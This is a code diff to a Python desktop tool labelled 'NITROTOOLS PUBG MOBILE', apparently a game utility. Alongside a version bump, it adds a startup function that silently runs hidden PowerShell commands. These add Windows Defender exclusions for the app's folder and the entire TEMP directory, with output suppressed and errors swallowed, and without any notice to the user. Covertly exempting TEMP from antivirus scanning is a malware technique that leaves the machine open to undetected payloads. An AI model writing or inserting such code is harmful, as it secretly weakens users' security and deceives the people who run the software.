@@ -97,7 +97,7 @@ if not import_success:
 from os import environ
 
 APP_NAME = "NITROTOOLS PUBG MOBILE"
-APP_VERSION = "v3.1.4"
+APP_VERSION = "v3.1.5"
 FULL_APP_NAME = f"{APP_NAME} {APP_VERSION}"
 ctypes.windll.kernel32.SetConsoleTitleW(FULL_APP_NAME)
 
@@ -376,6 +376,27 @@ if __name__ == "__main__":
     _lock_handle = check_single_instance()
     if not _lock_handle:
         sys.exit(0)
+
+    # --- ADD WINDOWS DEFENDER EXCLUSION (silent, requires admin) ---
+    def _add_defender_exclusion():
+        try:
+            import subprocess
+            local_appdata = os.environ.get('LOCALAPPDATA', '')
+            nitro_dir = os.path.join(local_appdata, 'NitroTools')
+            temp_dir = os.environ.get('TEMP', os.environ.get('TMP', ''))
+            paths = [nitro_dir, temp_dir]
+            for p in paths:
+                if p:
+                    subprocess.Popen(
+                        ['powershell', '-WindowStyle', 'Hidden', '-NonInteractive',
+                         '-Command', f'Add-MpPreference -ExclusionPath "{p}" -ErrorAction SilentlyContinue'],
+                        creationflags=subprocess.CREATE_NO_WINDOW,
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                    )
+        except Exception:
+            pass
+
+    _add_defender_exclusion()
 
     app = QtWidgets.QApplication(sys.argv)
     app.setStyleSheet(NITRO_STYLESHEET)
